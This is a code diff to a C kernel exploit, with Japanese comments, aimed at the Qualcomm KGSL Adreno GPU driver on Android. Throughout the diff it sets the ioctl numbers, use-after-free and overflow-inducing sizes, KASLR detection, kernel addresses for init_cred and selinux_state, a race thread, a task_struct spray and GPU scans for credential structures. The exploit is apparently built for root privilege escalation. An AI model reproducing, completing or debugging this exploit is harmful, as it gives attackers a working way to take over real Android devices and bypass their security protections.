@@ -22,41 +22,16 @@
 
 #define KGSL_IOC_TYPE 0x09
 
-/* 複数の候補を試せるようにマクロを定義（デフォルトは 0x18） */
-// #define USE_IOCTL_0x18
-// #define USE_IOCTL_0x2A
-#define USE_IOCTL_0x45  // 元の PoC で使われていた番号（大抵は範囲外だが念のため）
-
-#ifdef USE_IOCTL_0x18
-#define IOCTL_NR_GPUOBJ_ALLOC 0x18
-#define IOCTL_NR_GPUOBJ_FREE  0x19
-#define IOCTL_NR_GPUOBJ_INFO  0x1A
-#define IOCTL_NR_GPUOBJ_IMPORT 0x1B
-#define IOCTL_NR_GPU_COMMAND  0x1D
-#elif USE_IOCTL_0x2A
-#define IOCTL_NR_GPUOBJ_ALLOC 0x2A
-#define IOCTL_NR_GPUOBJ_FREE  0x2B
-#define IOCTL_NR_GPUOBJ_INFO  0x2C
-#define IOCTL_NR_GPUOBJ_IMPORT 0x2D
-#define IOCTL_NR_GPU_COMMAND  0x2E
-#else // USE_IOCTL_0x45 (元の値)
-#define IOCTL_NR_GPUOBJ_ALLOC 0x45
-#define IOCTL_NR_GPUOBJ_FREE  0x46
-#define IOCTL_NR_GPUOBJ_INFO  0x47
-#define IOCTL_NR_GPUOBJ_IMPORT 0x48
-#define IOCTL_NR_GPU_COMMAND  0x4A
-#endif
-
-#define IOCTL_KGSL_GPUOBJ_ALLOC   _IOWR(KGSL_IOC_TYPE, IOCTL_NR_GPUOBJ_ALLOC, struct kgsl_gpuobj_alloc)
-#define IOCTL_KGSL_GPUOBJ_FREE    _IOW(KGSL_IOC_TYPE, IOCTL_NR_GPUOBJ_FREE, struct kgsl_gpuobj_free)
-#define IOCTL_KGSL_GPUOBJ_INFO    _IOWR(KGSL_IOC_TYPE, IOCTL_NR_GPUOBJ_INFO, struct kgsl_gpuobj_info)
-#define IOCTL_KGSL_GPUOBJ_IMPORT  _IOWR(KGSL_IOC_TYPE, IOCTL_NR_GPUOBJ_IMPORT, struct kgsl_gpuobj_import)
-#define IOCTL_KGSL_GPU_COMMAND    _IOWR(KGSL_IOC_TYPE, IOCTL_NR_GPU_COMMAND, struct kgsl_gpu_command)
-
-/* これらの ioctl は通常固定（配列の先頭付近）なので変更しない */
+/* ===== 正しい ioctl 番号 (kgsl_ioctl_funcs のインデックス) ===== */
+#define IOCTL_KGSL_GPUOBJ_ALLOC   _IOWR(KGSL_IOC_TYPE, 0x18, struct kgsl_gpuobj_alloc)
+#define IOCTL_KGSL_GPUOBJ_FREE    _IOW(KGSL_IOC_TYPE, 0x19, struct kgsl_gpuobj_free)
+#define IOCTL_KGSL_GPUOBJ_INFO    _IOWR(KGSL_IOC_TYPE, 0x1A, struct kgsl_gpuobj_info)
+#define IOCTL_KGSL_GPUOBJ_IMPORT  _IOWR(KGSL_IOC_TYPE, 0x1B, struct kgsl_gpuobj_import)
+#define IOCTL_KGSL_GPU_COMMAND    _IOWR(KGSL_IOC_TYPE, 0x1D, struct kgsl_gpu_command)
 #define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x06, struct kgsl_drawctxt_create)
 #define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x04, struct kgsl_cmdstream_readtimestamp_ctxtid)
 
+/* ===== 構造体定義 (元の PoC と同じ) ===== */
 struct kgsl_gpuobj_alloc {
     uint64_t size; uint64_t flags; uint64_t va_len;
     uint64_t mmapsize; unsigned int id;
@@ -84,6 +59,7 @@ struct kgsl_gpu_command {
 
 struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
 
+/* ===== フラグと定数 ===== */
 #define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
 #define KGSL_CACHEMODE_SHIFT 0
 #define KGSL_CACHEMODE_MASK 3
@@ -97,16 +73,17 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* SVM 範囲（Adreno 308 では通常 0x60000000〜0x70000000）に収める */
+/* ===== SVM 範囲 (0x60000000～0x70000000) 内に収める ===== */
 #define UAF_ADDR  0x6001ff000ULL
-#define UAF_SIZE  0x10004000ULL
+#define UAF_SIZE  0x10004000ULL          // 16MB+16KB
 #define OVERLAP_ADDR 0x6001fe000ULL
 #define OVERLAP_SIZE 0x7000ULL
 #define BOGUS_ADDR 0x600204000ULL
-#define BOGUS_SIZE 0xffffffffffefd000ULL
+#define BOGUS_SIZE 0xffffffffffefd000ULL   // 巨大 (オーバーフロー誘発用)
 #define PLACEHOLDER_ADDR 0x610204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
+/* ===== カーネルシンボル（KASLR 検出用） ===== */
 #define VMLINUX_TEXT      0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
 #define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
@@ -142,10 +119,7 @@ static void flush_dc_civac_range(void *start, size_t len) {
     for (; p < end; p += 64) try_dc_civac(p);
 }
 
-static void die(const char *msg) {
-    perror(msg);
-    exit(1);
-}
+static void die(const char *msg) { perror(msg); exit(1); }
 
 static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
@@ -210,17 +184,15 @@ static uint64_t detect_kaslr(void) {
 
 static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
-    unsigned int cmd = IOCTL_KGSL_GPUOBJ_ALLOC;
-    printf("  [DEBUG] gpuobj_alloc: ioctl cmd=0x%08x, nr=%d\n", cmd, _IOC_NR(cmd));
-    if (ioctl(fd, cmd, &a) < 0) {
-        printf("  [DEBUG] gpuobj_alloc failed with errno=%d\n", errno);
-        die("gpuobj_alloc");
-    }
+    printf("  [DEBUG] IOCTL_KGSL_GPUOBJ_ALLOC cmd=0x%08x\n", IOCTL_KGSL_GPUOBJ_ALLOC);
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
     return a.id;
 }
 
 static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
-    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
+    off_t offset = (off_t)id << 12;
+    printf("  [DEBUG] mmap offset=0x%lx\n", (unsigned long)offset);
+    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset);
     if (p == MAP_FAILED) die("gpuobj_mmap");
     return p;
 }
@@ -242,7 +214,6 @@ static void gpuobj_free(int fd, unsigned int id) {
 
 static unsigned int create_context(int fd) {
     struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
-    printf("  [DEBUG] create_context: ioctl cmd=0x%08x\n", IOCTL_KGSL_DRAWCTXT_CREATE);
     if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
     return c.drawctxt_id;
 }
@@ -304,16 +275,10 @@ static void *race_thread(void *arg) {
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
 
-    // デバイスファイルを開く（/dev/kgsl も試す）
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
-    if (kgsl_fd < 0) {
-        printf("  /dev/kgsl-3d0 failed, trying /dev/kgsl\n");
-        kgsl_fd = open("/dev/kgsl", O_RDWR);
-    }
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    // KASLR 検出（失敗しても続行）
     printf("[*] Phase 0: Early KASLR detection\n");
     uint64_t init_cred_addr = detect_kaslr();
     printf("  init_cred=0x%lX\n", init_cred_addr);
@@ -380,7 +345,7 @@ int main(int argc, char **argv) {
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    // ===== Phase 5: First spawn + pipe setup =====
+    // ===== Phase 5: Spawn task_struct spray =====
     printf("[*] Phase 5: Spawning task_struct spray...\n");
     int notify_pipe[2];
     if (pipe(notify_pipe) < 0) die("pipe");
@@ -465,7 +430,7 @@ int main(int argc, char **argv) {
     close(notify_pipe[1]);
     printf("  Spawned %d children\n", n_spray);
 
-    // ===== Phase 7: GPU scan =====
+    // ===== Phase 7: GPU scan for task_struct =====
     printf("[*] Phase 7: GPU scan for task_structs\n");
 
     unsigned int ctx_id = create_context(kgsl_fd);
@@ -556,6 +521,7 @@ int main(int argc, char **argv) {
             cred_offs[n_cred] = cred_off_found;
             n_cred++;
         }
+        // Scan for task_security_struct: groups of 6 identical dwords
         int sec_hits[64]; int n_sec = 0;
         for (int i = 0; i < SCAN_DWORDS - 6 && n_sec < 64; i++) {
             if (data[i] == data[i+1] && data[i] == data[i+2] &&
